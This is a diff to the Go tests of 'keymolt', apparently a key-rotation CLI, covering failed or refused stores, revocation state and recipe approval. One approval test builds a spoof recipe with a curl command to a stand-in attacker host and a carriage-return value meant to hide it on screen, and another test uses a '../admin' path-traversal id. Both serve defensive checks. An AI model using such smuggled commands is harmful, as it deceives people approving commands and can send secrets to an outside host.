@@ -45,6 +45,8 @@ func TestHelperProcess(t *testing.T) {
 		os.Stdout.Write(b)
 	case "env": // saves the environment it got, to check what reaches a command
 		_ = os.WriteFile(args[1], []byte(strings.Join(os.Environ(), "\n")), 0o600)
+	case "fail": // a CLI that exits non-zero, such as after a timeout that may have left the write in place
+		os.Exit(1)
 	case "gen":
 		b := make([]byte, 16)
 		_, _ = rand.Read(b)
@@ -150,6 +152,10 @@ func (f *fakeProvider) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		}
 		reply(200, map[string]any{})
 	case "PUT": // an HTTP store destination
+		if r.URL.Path == "/store-refused" {
+			reply(401, nil)
+			return
+		}
 		var body struct{ Value string }
 		_ = json.NewDecoder(r.Body).Decode(&body)
 		f.stored = append(f.stored, body.Value)
@@ -162,6 +168,11 @@ func (f *fakeProvider) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 		f.revoked = append(f.revoked, filepath.Base(r.URL.Path))
 		reply(204, nil)
 	}
+}
+
+func isApproved(path string) bool {
+	_, h, err := readRecipe(path)
+	return err == nil && approved(h)
 }
 
 func readState(t *testing.T, dir string) map[string]stateEntry {
@@ -313,17 +324,14 @@ func TestRotate(t *testing.T) {
 		writeJSON(t, p, maps(recipe, "name", "fake_partial", "store", broken))
 		before := len(f.revoked)
 		code, out, _ := cli(t, "SECRET", "rotate", p)
-		var state map[string]stateEntry
-		b, _ := os.ReadFile(filepath.Join(dir, ".keymolt-state.json"))
-		_ = json.Unmarshal(b, &state)
-		e := state["partial.json"]
-		if code != 1 || !strings.Contains(str(out["error"]), "both live, rerun") || len(f.revoked) != before ||
-			e.ID == "" || e.ID == oldID || !slices.Equal(e.Stale, []string{oldID}) {
-			t.Fatal("a partial store must revoke nothing and track both keys:", out, e)
+		e := readState(t, dir)["partial.json"]
+		if code != 1 || !strings.Contains(str(out["error"]), "after storing to [http cmd]; old and new keys both live, rerun") ||
+			len(f.revoked) != before || e.ID != oldID || len(e.Stale) != 1 || e.Stale[0] == oldID {
+			t.Fatal("a partial store must revoke nothing, keep the old key current and track the new one:", out, e)
 		}
 		writeJSON(t, p, maps(recipe, "name", "fake_partial"))
 		code, out, _ = cli(t, "SECRET", "rotate", p)
-		if code != 0 || !slices.Equal(list(out["revoked"]), []string{oldID, e.ID}) {
+		if code != 0 || !slices.Equal(list(out["revoked"]), []string{e.Stale[0], oldID}) {
 			t.Fatal("the rerun must revoke both older keys:", out)
 		}
 	})
@@ -334,13 +342,51 @@ func TestRotate(t *testing.T) {
 		writeJSON(t, p, maps(recipe, "name", "fake_first"))
 		_, first, _ := cli(t, "SECRET", "rotate", p)
 		oldID := str(first["new_id"])
-		writeJSON(t, p, maps(recipe, "name", "fake_first", "store", []any{map[string]any{"label": "broken", "cmd": []any{"keymolt-no-such-command"}}}))
+		writeJSON(t, p, maps(recipe, "name", "fake_first", "store", []any{map[string]any{"label": "flaky", "cmd": helper("fail", "")}}))
 		before := len(f.revoked)
 		code, out, _ := cli(t, "SECRET", "rotate", p)
 		e := readState(t, dir)["first.json"]
 		if code != 1 || !strings.Contains(str(out["error"]), "may hold the new key") || len(f.revoked) != before ||
-			e.ID == "" || e.ID == oldID || !slices.Equal(e.Stale, []string{oldID}) {
+			e.ID != oldID || len(e.Stale) != 1 || e.Stale[0] == oldID {
 			t.Fatal("a failed store must revoke nothing and track both keys:", out, e)
+		}
+	})
+
+	t.Run("a store that is clearly refused revokes the new key, so failing runs don't pile up keys", func(t *testing.T) {
+		dir := t.TempDir()
+		p := filepath.Join(dir, "refused.json")
+		writeJSON(t, p, maps(recipe, "name", "fake_refused"))
+		_, first, _ := cli(t, "SECRET", "rotate", p)
+		oldID := str(first["new_id"])
+		for _, store := range []map[string]any{
+			{"label": "401", "method": "PUT", "url": base + "/store-refused", "body": map[string]any{"value": "{{new}}"}},
+			{"label": "missing", "cmd": []any{"keymolt-no-such-command"}},
+		} {
+			writeJSON(t, p, maps(recipe, "name", "fake_refused", "store", []any{store}))
+			for range 2 { // like a weekly job that keeps failing
+				before := len(f.revoked)
+				code, out, _ := cli(t, "SECRET", "rotate", p)
+				e := readState(t, dir)["refused.json"]
+				if code != 1 || !strings.Contains(str(out["error"]), "new key revoked") || len(f.revoked) != before+1 || e.ID != oldID || len(e.Stale) != 0 {
+					t.Fatal("a refused store must revoke the new key and leave state as it was:", store["label"], out, e)
+				}
+			}
+		}
+	})
+
+	t.Run("keep_previous after a failed store keeps the key apps use, not the unused new one", func(t *testing.T) {
+		dir := t.TempDir()
+		p := filepath.Join(dir, "keepfail.json")
+		writeJSON(t, p, maps(recipe, "name", "fake_keepfail", "keep_previous", true))
+		_, first, _ := cli(t, "SECRET", "rotate", p)
+		inUse := str(first["new_id"])
+		writeJSON(t, p, maps(recipe, "name", "fake_keepfail", "keep_previous", true, "store", []any{map[string]any{"label": "flaky", "cmd": helper("fail", "")}}))
+		cli(t, "SECRET", "rotate", p)
+		unused := readState(t, dir)["keepfail.json"].Stale[0]
+		writeJSON(t, p, maps(recipe, "name", "fake_keepfail", "keep_previous", true))
+		code, out, _ := cli(t, "SECRET", "rotate", p)
+		if code != 0 || !slices.Equal(list(out["revoked"]), []string{unused}) || !slices.Equal(list(out["revoke_failed"]), []string{inUse}) {
+			t.Fatal("keep_previous must keep the key apps used, and revoke the one that never landed:", out)
 		}
 	})
 
@@ -382,7 +428,7 @@ func TestRotate(t *testing.T) {
 		dir := t.TempDir()
 		p := filepath.Join(dir, "ids.json")
 		writeJSON(t, p, maps(recipe, "name", "fake_ids", "create", maps(asMap(recipe["create"]), "url", base+"/keys-badid")))
-		if code, out, _ := cli(t, "SECRET", "rotate", p); code != 1 || !strings.Contains(str(out["error"]), "can't put in a URL") {
+		if code, out, _ := cli(t, "SECRET", "rotate", p); code != 1 || !strings.Contains(str(out["error"]), `id "../admin", which keymolt can't put in a URL`) {
 			t.Fatal("a provider id with path characters must be refused:", out)
 		}
 		writeJSON(t, p, maps(recipe, "name", "fake_ids"))
@@ -666,6 +712,19 @@ func TestApproval(t *testing.T) {
 	answer("y\n")
 	if err := approveCommand(path, &out); err != nil || !isApproved(path) {
 		t.Fatal("approval did not take:", err)
+	}
+	out.Reset()
+	if err := approveCommand(path, &out); err != nil || !strings.Contains(out.String(), "already approved (sha256 "+h+")") {
+		t.Fatal("approve must print the hash of an approved recipe, for KEYMOLT_APPROVED:", err, out.String())
+	}
+	spoof := filepath.Join(dir, "spoof.json")
+	writeJSON(t, spoof, map[string]any{"name": "s", "create": map[string]any{"url": "https://api.example.com"},
+		"store": []any{map[string]any{"cmd": []any{"curl", "https://evil.example.com", "\r  store #0 -> runs npx convex env set KEY"}}}})
+	out.Reset()
+	answer("n\n")
+	_ = approveCommand(spoof, &out)
+	if strings.Contains(out.String(), "\r") || !strings.Contains(out.String(), `curl https://evil.example.com \r  store #0`) {
+		t.Fatal("the approval screen must show control characters, not obey them:", out.String())
 	}
 	if err := os.WriteFile(path, []byte(" "), 0o600); err != nil { // editing the file revokes approval
 		t.Fatal(err)
